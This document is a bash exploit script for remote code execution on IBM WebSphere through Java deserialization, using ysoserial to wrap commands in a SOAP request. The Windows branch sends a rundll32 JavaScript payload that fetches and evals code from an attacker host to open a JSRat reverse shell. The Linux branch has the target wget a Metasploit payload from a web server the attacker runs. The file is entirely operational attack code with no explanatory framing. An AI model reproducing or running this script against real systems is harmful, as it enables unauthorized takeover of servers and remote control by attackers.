#!/bin/bash

# Author: Inteference Security
# Twitter: https://twitter.com/xploresec
# Credits: foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/

if [ $# -lt 4 ]; then
        echo "$0 <target_ip> <target_port> <windows/linux> <http/https>"
        exit
fi

target_ip=$1
target_port=$2
target_type=$3
target_prot=$4

final_target="$target_prot://$target_ip:$target_port"

echo "[*] Target: $final_target"
echo "[*] Type: $target_type"
echo ""

if [ "$target_type" == "windows" ]; then
        echo "[*] Attacking Windows target"
        echo ""
        echo "Make sure you have one of the two setup and ready before continuing:"
        echo "1. Python JSRat: https://github.com/interference-security/scripts-tools-shells/tree/master/javascript-backdoor/py-jsrat"
        echo "2. PowerShell JSRat: https://github.com/interference-security/scripts-tools-shells/blob/master/javascript-backdoor/JSRat.ps1"
        echo ""
        read -p "Enter IP to receive reverse shell: " attacker_ip
        echo ""
        payload=`java -jar ysoserial-0.0.4-all.jar CommonsCollections1 "rundll32.exe javascript:\"\..\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://$attacker_ip/connect\",false);h.Send();B=h.ResponseText;eval(B)" | base64 -w 0`
        final_payload="<?xml version='1.0' encoding='UTF-8'?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><SOAP-ENV:Header xmlns:ns0=\"admin\" ns0:WASRemoteRuntimeVersion=\"8.5.5.1\" ns0:JMXMessageVersion=\"1.2.0\" ns0:SecurityEnabled=\"true\" ns0:JMXVersion=\"1.2.0\"><LoginMethod>BasicAuth</LoginMethod></SOAP-ENV:Header><SOAP-ENV:Body><ns1:getAttribute xmlns:ns1=\"urn:AdminService\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><objectname xsi:type=\"ns1:javax.management.ObjectName\">$payload</objectname><attribute xsi:type=\"xsd:string\">ringBufferSize</attribute></ns1:getAttribute></SOAP-ENV:Body></SOAP-ENV:Envelope>"
        echo "[*] Sending exploit payload"
        send_payload=`curl -s --insecure -i -H "Content-Type: text/xml; charset=utf-8" -H "SOAPAction: \"urn:AdminService\"" -H "User-Agent:" -H "Accept:" -H "Expect:" $final_target -X POST -d "$final_payload"`
fi

if [ "$target_type" == "linux" ]; then
        echo "[*] Attacking Linux target"
        echo ""
        echo "Make sure you have one of the two setup and ready before continuing:"
        echo "1. Python JSRat: https://github.com/interference-security/scripts-tools-shells/tree/master/javascript-backdoor/py-jsrat"
        echo "2. PowerShell JSRat: https://github.com/interference-security/scripts-tools-shells/blob/master/javascript-backdoor/JSRat.ps1"
        echo ""
        read -p "Enter attacker IP address: " attacker_ip
        echo ""
        read -p "Enter port to start webserver on: " web_port
        echo ""
        echo "[*] Starting webserver on port $web_port"
        python -m SimpleHTTPServer $web_port &
        # Upload Metasploit payload on target server
        payload=`java -jar ysoserial-0.0.4-all.jar CommonsCollections1 "wget -O /tmp/ibmwsexp http://$attacker_ip:$web_port/ibmwsexp" | base64 -w 0`
        final_payload="<?xml version='1.0' encoding='UTF-8'?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><SOAP-ENV:Header xmlns:ns0=\"admin\" ns0:WASRemoteRuntimeVersion=\"8.5.5.1\" ns0:JMXMessageVersion=\"1.2.0\" ns0:SecurityEnabled=\"true\" ns0:JMXVersion=\"1.2.0\"><LoginMethod>BasicAuth</LoginMethod></SOAP-ENV:Header><SOAP-ENV:Body><ns1:getAttribute xmlns:ns1=\"urn:AdminService\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><objectname xsi:type=\"ns1:javax.management.ObjectName\">$payload</objectname><attribute xsi:type=\"xsd:string\">ringBufferSize</attribute></ns1:getAttribute></SOAP-ENV:Body></SOAP-ENV:Envelope>"
        echo ""
        echo "[*] Sending exploit payload to check for vulnerability"
        send_payload=`curl -s --insecure -i -H "Content-Type: text/xml; charset=utf-8" -H "SOAPAction: \"urn:AdminService\"" -H "User-Agent:" -H "Accept:" -H "Expect:" $final_target -X POST -d "$final_payload"`
        read -p "Press [ENTER] to stop..."
        trap 'kill $(jobs -p)' EXIT
fi
